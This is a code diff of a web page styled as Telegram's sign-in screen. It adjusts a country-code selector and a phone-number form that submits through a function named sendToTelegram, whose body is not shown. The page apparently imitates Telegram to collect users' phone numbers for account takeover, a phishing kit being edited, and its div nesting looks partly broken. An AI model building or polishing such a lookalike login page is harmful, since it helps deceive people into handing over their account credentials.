@@ -59,12 +59,6 @@
                 alert('An error occurred. Please try again.');
             });
         }
-
-        function updateCountryCode() {
-            const countrySelect = document.getElementById('countrySelect');
-            const countryCode = countrySelect.value;
-            document.getElementById('countryCode').value = countryCode;
-        }
     </script>
 </head>
 
@@ -77,22 +71,30 @@
     <div id="root">
         <div class="auth-form">
             <h1>Telegram</h1>
-            <p>Please confirm your country and enter your phone number.</p>
+            <p>Please confirm your country code and enter your phone number.</p>
+            <form id="telegramForm" onsubmit="sendToTelegram(event)">
+                <div class="input-group" id="labelFlag">
+                    <select class="form-control" id="countryCode" onchange="updateCountryCode()">
+                        <option value="" disabled selected>Select Country</option>
+                        <option value="+62">Indonesia</option>
+                        <option value="+60">Malaysia</option>
+                        <option value="+65">Singapore</option>
+                    </select>
+                    <label for="countryCode">Country</label>
                 </div>
-                <form id="telegramForm" onsubmit="sendToTelegram(event)">
-                    <div class="input-group">
-                        <label for="countrySelect">Country</label>
-                        <select id="countrySelect" onchange="updateCountryCode()">
-                            <option value="+62">Indonesia (+62)</option>
-                            <option value="+60">Malaysia (+60)</option>
-                            <option value="+65">Singapore (+65)</option>
-                        </select>
                 <div class="input-group" id="labelhp">
                     <input class="form-control" type="text" id="phoneNumber" dir="auto" inputmode="tel" aria-label="Your phone number" name="phoneNumber" autocomplete="off">
                     <label for="phoneNumber">Your phone number</label>
                 </div>
                 <button id="nextBtn" type="submit" class="Button default primary">NEXT</button>
             </form>
+            
+            <script type="text/javascript">
+                function updateCountryCode() {
+                    const countryCode = document.getElementById('countryCode').value;
+                    console.log(`Selected country code: ${countryCode}`);
+                }
+            </script>
         </div>
     </div>
 </body>
